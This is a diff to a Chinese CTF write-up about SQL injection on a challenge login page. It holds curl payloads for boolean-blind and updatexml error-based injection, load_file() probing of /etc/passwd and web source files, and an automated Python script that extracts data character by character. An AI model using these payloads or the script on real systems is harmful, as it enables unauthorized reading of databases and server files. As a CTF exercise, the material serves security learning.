@@ -84,28 +84,235 @@ function login(name, password_) {
 curl -s -X POST -d "name=admin&pass=admin" "TARGET/login.php"
 # → {"error":1,"msg":"账号或密码错误"}
 
-# 添加单引号 → SQL 语法报错
+# 添加单引号（不加 tips） → 只能看到 JSON 提示，无 SQL 报错
+curl -s -X POST -d "name=admin'&pass=admin" "TARGET/login.php"
+# → {"error":1,"msg":"账号不存在"}
+
+# 添加单引号 + tips=1 → 原始 SQL 报错出现在 JSON 前面！
 curl -s -X POST -d "name=admin'&pass=admin" "TARGET/login.php?tips=1"
-# → You have an error in your SQL syntax... near ''admin''' at line 1
+# → You have an error in your SQL syntax; check the manual that
+#   corresponds to your MariaDB server version for the right syntax
+#   to use near ''admin''' at line 1
+# → {"error":1,"msg":"账号不存在"}
 ```
+
+**关键区别**：
+- 不加 `?tips=1`：PHP 只返回 JSON，错误信息被吞掉，只能看到 `账号不存在`
+- 加 `?tips=1`：PHP 在 JSON 前面**直接 echo 了 MySQL 原始报错**（不是 JSON 格式），这就是 2.1 节 HTML 注释提示的作用
 
 确认 `name` 参数存在 SQL 注入，且为**单引号字符型**。
 
 ## 2.4 确认布尔盲注基底
 
-```bash
-# TRUE 条件（用户存在）
-curl -s -X POST -d "name=admin' and 1=1 and '1'='1&pass=x" "TARGET/login.php"
-# → {"error":1,"msg":"账号或密码错误"}
+> **在进入报错注入之前，先用布尔盲注确认注入点的可控性。**
 
-# FALSE 条件（用户不存在）
+### Payload 拆解
+
+后端 SQL 模板推测为：
+
+```sql
+SELECT * FROM users WHERE name='[输入]' AND pass='[输入]'
+```
+
+POST 数据 `name=admin' and 1=1 and '1'='1&pass=x` 代入后：
+
+```
+			     ┌── 原始开引号         原始闭引号 ──┐
+                 │                                │
+WHERE name='admin' and 1=1 and '1'='1' AND pass='x'
+           ─┬─            ─┬─       ─┬─            ─┬─
+            │              │         │              └── pass 填任意值
+            │              │         └── 我们补的引号，和原始闭引号拼成 '1'='1'（恒真）
+            │              └── 注入的布尔条件
+            └── admin 闭合第一个字符串
+```
+
+关键技巧 **`'1'='1`** 是用来「消耗」原始 SQL 中 `name='...'` 那个**结尾单引号**的：
+
+- 我们的输入以 `'1` 开头 → 这个 `'` 配合原始模板的 `'`（绿色那个），形成字符串 `'1'`
+- `='1` → 等于字符串 `'1'`
+- 末尾我们**没有**闭合最后一个 `'`，留给原始模板的闭引号来闭合
+
+最终 `'1'='1'`（三个 `'` 中最后一个来自模板），意思是 `'1' = '1'`，恒真。
+
+**`&pass=x`** 只是给 `pass` 参数填一个任意值（`x`），因为后端同时校验两个参数都不能为空。
+
+### 验证 TRUE/FALSE
+
+```bash
+# TRUE 条件（1=1 成立 + 引号闭合正确 → 查到 admin 用户）
+curl -s -X POST -d "name=admin' and 1=1 and '1'='1&pass=x" "TARGET/login.php"
+# → {"error":1,"msg":"账号或密码错误"}  ← 用户存在，只是密码不对
+
+# FALSE 条件（1=2 不成立 → 查不到任何用户）
 curl -s -X POST -d "name=admin' and 1=2 and '1'='1&pass=x" "TARGET/login.php"
-# → {"error":1,"msg":"账号不存在"}
+# → {"error":1,"msg":"账号不存在"}      ← SQL 返回空结果集
 ```
 
 两种响应状态：
-- **TRUE**：`msg="账号或密码错误"` → SQL 条件成立
-- **FALSE**：`msg="账号不存在"` → SQL 条件不成立
+- **TRUE**：`msg="账号或密码错误"` → SQL 条件成立，查到了用户行
+- **FALSE**：`msg="账号不存在"` → SQL 条件不成立，空结果集
+
+## 2.5 通过 load_file() 探测环境
+
+确认布尔盲注可用后，在探索 SQL 函数权限时，顺手测试了 `load_file()` 文件读取函数：
+
+```bash
+# 测试 load_file 是否可用（读 /etc/passwd 验证）
+curl -s -X POST \
+  -d "name=admin' and length(load_file('/etc/passwd'))>0 and '1'='1&pass=x" \
+  "TARGET/login.php"
+# → {"error":1,"msg":"账号或密码错误"}  ← TRUE！说明文件存在且可读
+
+# 读取登录成功后的跳转页面 user.php
+curl -s -X POST \
+  -d "name=admin' and length(load_file('/var/www/html/user.php'))>0 and '1'='1&pass=x" \
+  "TARGET/login.php"
+# → {"error":1,"msg":"账号或密码错误"}  ← 文件存在！
+```
+
+然后用布尔盲注逐字符读出 `user.php` 源码。方法如下：
+
+### 逐字符提取原理（二分查找）
+
+每一轮发送一个 TRUE/FALSE 判断：
+
+```
+admin' and ascii(substr(load_file('/var/www/html/user.php'), N, 1)) > M and '1'='1
+         ─┬─  ─────────────────────────────────────────── ─┬── ─┬─
+          │                                                │    │
+          │         取文件第 N 个字符的 ASCII 值              │    比较
+          │                                                │
+          └── 2.4 节的布尔盲注模板                            └── 二分中点
+```
+
+- **TRUE** (账号或密码错误) → 字符的 ASCII 码 **> M**，上移搜索下界
+- **FALSE** (账号不存在) → 字符的 ASCII 码 **≤ M**，下移搜索上界
+
+用二分查找，每个字符约 7 次请求就能收敛到精确值。比如要提取第一个字符 `'<'` (ASCII 60)：
+
+```
+M=64: ascii('<') > 64?  60 > 64 → FALSE → high=63
+M=32: ascii('<') > 32?  60 > 32 → TRUE  → low=33
+M=48: ascii('<') > 48?  60 > 48 → TRUE  → low=49
+M=56: ascii('<') > 56?  60 > 56 → TRUE  → low=57
+M=60: ascii('<') > 60?  60 > 60 → FALSE → high=59
+M=58: ascii('<') > 58?  60 > 58 → TRUE  → low=59
+M=59: ascii('<') > 59?  60 > 59 → TRUE  → low=60
+→ 收敛到 60，查 ASCII 表得到 '<'
+```
+
+### 自动化脚本
+
+整个提取过程用 Python 脚本自动化，可直接执行：
+
+```python
+#!/usr/bin/env python3
+"""布尔盲注逐字符提取脚本 — 从 load_file() 读取文件内容"""
+import requests
+import sys
+
+TARGET = "http://6104ac91f00692661c75bbe3.http-ctf2.dasctf.com/login.php"
+
+def check(payload: str) -> bool:
+    """
+    发送布尔盲注 payload，返回 TRUE/FALSE。
+
+    TRUE  → "账号或密码错误" → SQL 条件成立，查到了用户行
+    FALSE → "账号不存在"     → SQL 条件不成立，空结果集
+    """
+    resp = requests.post(TARGET, data={"name": payload, "pass": "x"})
+    try:
+        msg = resp.json().get("msg", "")
+        return "错误" in msg          # "账号或密码错误" 包含 "错误"
+    except Exception:
+        return False
+
+def extract_value(query_expr: str, max_len: int = 500) -> str:
+    """
+    用二分查找逐字符提取 SQL 子查询的结果字符串。
+
+    query_expr: SQL 表达式，返回值必须是字符串
+               如 "load_file('/var/www/html/user.php')"
+    max_len:   最大提取长度（防止死循环）
+    """
+    result = ""
+    print(f"[*] Extracting...", end="", flush=True)
+
+    for pos in range(1, max_len + 1):
+        # ── 二分查找当前字符的 ASCII 码 ──
+        low, high = 1, 127
+        while low <= high:
+            mid = (low + high) // 2
+            # ascii(substr(..., pos, 1)) > mid ?
+            payload = (
+                f"admin' and ascii(substr({query_expr},{pos},1))>{mid}"
+                f" and '1'='1"
+            )
+            if check(payload):          # TRUE → 字符 ASCII 码 > mid
+                low = mid + 1
+            else:                        # FALSE → 字符 ASCII 码 ≤ mid
+                high = mid - 1
+
+        # ── 验证：精确匹配确认该位置确实有字符 ──
+        verify = (
+            f"admin' and ascii(substr({query_expr},{pos},1))={low}"
+            f" and '1'='1"
+        )
+        if check(verify):
+            ch = chr(low)
+            result += ch
+            # 终端友好输出：控制字符转义显示
+            if low == 10:        # 换行
+                sys.stdout.write("\\n\n")
+            elif low == 13:      # 回车
+                sys.stdout.write("\\r")
+            elif low == 9:       # 制表符
+                sys.stdout.write("\\t")
+            elif low < 32:       # 其他不可见字符
+                sys.stdout.write(f"[{low}]")
+            else:
+                sys.stdout.write(ch)
+            sys.stdout.flush()
+        else:
+            break                 # 连续匹配失败 → 文件结束
+
+    print()
+    return result
+
+
+if __name__ == "__main__":
+    # 读取 login.php 的源码
+    content = extract_value("load_file('/var/www/html/user.php')")
+    print(f"\n[+] 提取结果 ({len(content)} 字符):")
+    print(content)
+```
+
+**脚本核心逻辑**：
+
+```
+对于文件的每个位置 N（从 1 开始）：
+  1. 二分查找确定第 N 个字符的 ASCII 码
+  2. 用精确相等验证该字符确实存在
+  3. 验证失败 → 文件已读完，退出循环
+  4. 每个字符约 7 次 HTTP 请求
+```
+
+### 提取结果
+
+```php
+<?php
+session_start();
+if(empty($_SESSION['name'])){
+    echo "login first";
+}else{
+    echo "flag is in the database!";  // ← 关键信息
+}
+```
+
+**结论**：flag 存储在数据库中，必须通过 SQL 注入提取，不能靠读文件拿 flag。
+
+> `load_file()` 能读文件是因为 MySQL 用户可能有 `FILE` 权限，且 `secure_file_priv` 为空或未限制。这是信息收集阶段的意外收获。
 
 # 3. 漏洞分析
 
@@ -118,11 +325,13 @@ curl -s -X POST -d "name=admin' and 1=2 and '1'='1&pass=x" "TARGET/login.php"
   ↓
 线索 3：admin' 触发 SQL 语法错误 → 确认注入点
   ↓
-线索 4：load_file() 可读取 /var/www/html/user.php
-  ↓ → 源码显示 "flag is in the database!"
-确认 flag 在数据库中 → 需要报错注入提取
+线索 4：布尔盲注 TRUE/FALSE 状态可控 → 确认可逐字符提取数据
   ↓
-线索 5：sELECT 大小写混合可以绕过关键字过滤！
+线索 5：load_file() 函数可用 → 读取 user.php
+  ↓ → 源码显示 "flag is in the database!"
+确认 flag 在数据库中 → 必须用 SQL 提取（不能靠读文件）
+  ↓
+线索 6：sELECT 大小写混合可以绕过关键字过滤！
 ```
 
 ## 3.2 关键字绕过
@@ -148,13 +357,46 @@ curl -s -X POST -d "name=admin' and 1=2 and '1'='1&pass=x" "TARGET/login.php"
 
 布尔盲注速度太慢（每字符 8 次请求），且 `load_file` 已经确认 flag 在数据库。利用 `tips=1` 的 MySQL 错误回显功能，使用 `updatexml()` 函数进行报错注入，一次请求即可获取数据。
 
-**updatexml 报错注入原理**：
+### updatexml 报错注入原理
 
 ```sql
-updatexml(1, concat(0x7e, (子查询)), 1)
+updatexml(XML_target, XPath_expr, new_XML)
 ```
 
-`updatexml()` 的第二个参数要求是有效的 XPath 表达式。当传入非法 XPath（`~` 开头 + 查询结果）时，MySQL 会抛出 XPATH 语法错误，错误信息中包含查询结果。
+`updatexml()` 的第二个参数 `XPath_expr` 必须是一个**合法的 XPath 表达式**。如果传入非法 XPath，MySQL 会抛出错误，并把非法内容原样输出在报错信息中。我们正是利用这个报错来回显数据。
+
+### concat(0x7e, (子查询)) 的作用
+
+`0x7e` 是 ASCII 字符 **`~`**（波浪号）的十六进制写法：
+
+```
+concat(0x7e, (sELECT database()))
+     → concat('~', 'note')
+     → '~note'
+```
+
+**为什么必须加 `~`？**
+
+`~` 是一个**必定非法**的 XPath 字符。如果不加 `~`，子查询结果可能碰巧是合法 XPath（比如纯数字 `1`），MySQL 就不会报错，数据拿不到：
+
+| 传入 updatexml 的 XPath | 是否报错 | 回显内容 |
+|-------------------------|---------|---------|
+| `concat('~', 'note')` → `~note` | ✅ 报错（`~` 非法） | `XPATH syntax error: '~note'` |
+| 不加 `~`，直接 `'note'` | ✅ 报错（字符串非法） | `XPATH syntax error: 'note'` |
+| 不加 `~`，只传数字 `1` | ❌ 不报错！（`1` 是合法 XPath） | 什么都拿不到 |
+
+`~` 就是一个**保险**——保证无论子查询返回什么，都会触发 XPATH 报错。
+
+### 从报错中提取数据
+
+```
+原始响应：string(33) "XPATH syntax error: '~fl4g,users'"
+
+用正则匹配 ~ 后面的内容：
+  /XPATH syntax error: '~([^']*)'/
+                              ↑ 捕获 ~ 之后、下一个 ' 之前的内容
+→ 提取结果：fl4g,users
+```
 
 ## 3.5 完整 SQL 查询推演
 
